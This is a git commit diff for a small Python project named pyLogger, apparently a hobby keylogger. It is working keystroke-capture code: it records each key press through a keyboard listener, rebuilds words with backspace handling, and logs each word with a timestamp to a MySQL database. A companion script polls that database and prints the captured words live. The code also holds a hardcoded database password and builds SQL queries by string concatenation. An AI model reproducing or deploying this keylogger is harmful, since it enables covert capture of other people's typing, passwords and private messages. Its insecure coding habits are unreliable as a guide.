8b93d8b98f4a2d1c062eec2c65b955e3dee25615
PierreIsHere <34163077+PierreIsHere@users.noreply.github.com>
2019-03-01 19:27:17 -0500

    Add files via upload

--- host.py
+++ host.py
@@ -1,5 +1,5 @@
 import mysql.connector
-
+from time import sleep
 mydb = mysql.connector.connect(
   host="localhost",
   user="root",
@@ -8,9 +8,21 @@ mydb = mysql.connector.connect(
 )
 mycursor = mydb.cursor()
 
-mycursor.execute("SELECT * FROM words")
-
-myresult = mycursor.fetchall()
-
-for x in myresult:
-  print(x)
+count = 1
+typed = 0
+true = 1
+while true == 1:
+	if typed == 0:
+		mycursor.execute("SELECT * FROM words WHERE id = '"+str(count)+"'")
+		myresult = mycursor.fetchall()
+		for x in myresult:
+  			print(x)
+		typed = 1
+		count = count + 1
+	if typed == 1:
+		sleep(0.2)
+		mycursor.execute("SELECT * FROM words WHERE id = '"+str(count)+"'")
+		myresult = mycursor.fetchall()
+		# print(len(myresult))
+		if len(myresult) == 1:
+			typed = 0
--- pyLogger.py
+++ pyLogger.py
@@ -9,34 +9,37 @@ mydb = mysql.connector.connect(
   passwd="sameed123",
   database="pylogger"
 )
-mycursor = mydb.cursor()
-
+mycursor = mydb.cursor()	
 def on_release(key):
     letter = key
     if letter == keyboard.Key.tab:	
-        sql = "DELETE FROM words"
+        sql = "DELETE FROM words" 
+        mycursor.execute(sql)
+        mydb.commit()
+        sql = "ALTER TABLE words AUTO_INCREMENT = 1"
         mycursor.execute(sql)
         mydb.commit()
         return False
 letters = []
 words = []
-def log(key):
+def log(key):		 
 	letter = key
-	if letter != keyboard.Key.space and letter != keyboard.Key.enter:	
-		letters.append(letter)
-	# if letter h	hey this is pretty cool right? 	
-	if letter == keyboard.Key.space or letter == keyboard.Key.enter:	
+	if letter != keyboard.Key.space and letter != keyboard.Key.enter and letter != keyboard.Key.tab and letter != keyboard.Key.up and letter != keyboard.Key.left and letter != keyboard.Key.right and letter != keyboard.Key.down and letter != keyboard.Key.backspace:	
+		letters.append(letter)	
+	if letter == keyboard.Key.backspace:
+		if len(letters) > 0:
+			del letters[-1]
+	if letter == keyboard.Key.space or letter == keyboard.Key.enter or letter == keyboard.Key.tab:			
 		print(letters)
-		named_tuple = time.localtime() # get struct_time
+		named_tuple = time.localtime() # asd 	asdasd dsddsd  	 
 		time_string = time.strftime("%m/%d/%Y, %H:%M:%S", named_tuple)
 		word = ''.join(map(str, letters))
-		# words.append(word.replace("'",""))
 		word = word.replace("'","")
 		sql = "INSERT INTO words (word, typed) VALUES (%s, %s)"
 		val = (word, time_string)
 		mycursor.execute(sql, val)
 		mydb.commit()
-		print("1 record inserted, ID:", mycursor.lastrowid)
+		print("1 record inserted, ID:", mycursor.lastrowid)	
 		del letters[:]
 	print(letters)
 	print(words)
